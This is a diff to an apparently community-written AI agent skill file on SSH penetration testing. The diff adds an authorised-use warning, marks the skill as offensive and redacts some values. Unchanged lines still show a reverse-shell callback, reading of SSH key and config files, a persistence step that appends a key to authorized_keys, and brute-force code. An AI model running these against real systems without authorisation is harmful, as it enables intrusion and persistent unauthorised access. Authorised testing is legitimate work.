@@ -1,11 +1,14 @@
 ---
 name: ssh-penetration-testing
 description: "Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+
+> [!WARNING]
+> **AUTHORIZED USE ONLY:** This skill contains offensive security techniques. You must have explicit, written permission from the system owner before executing any of these commands. Do not use this skill against targets you do not own or are not authorized to test.
 
 # SSH Penetration Testing
 
@@ -255,7 +258,7 @@ ssh -R 8080:localhost:80 user@192.168.1.100
 # Remote can access via localhost:8080
 
 # Reverse shell callback
-ssh -R 4444:localhost:4444 user@192.168.1.100
+ssh -R [REDACTED_REVERSE_SHELL_PORT]:localhost:[REDACTED_REVERSE_SHELL_PORT] [REDACTED_USER]@[REDACTED_TARGET_IP]
 ```
 
 #### Dynamic Port Forwarding (SOCKS Proxy)
@@ -312,7 +315,7 @@ cat ~/.ssh/known_hosts
 cat ~/.ssh/authorized_keys
 
 # Add persistence (add your key)
-echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
+echo "[REDACTED_SSH_KEY]" >> ~/.ssh/authorized_keys
 
 # Extract SSH configuration
 cat /etc/ssh/sshd_config
@@ -367,7 +370,7 @@ def ssh_brute_force(host, username, wordlist):
         client = ssh_connect(host, username, password.strip())
         if client:
             # Run post-exploitation commands
-            output, _ = execute_command(client, 'id; uname -a')
+            output, _ = execute_command(client, '[REDACTED_POST_EXPLOITATION_COMMANDS]')
             print(output)
             client.close()
             return True
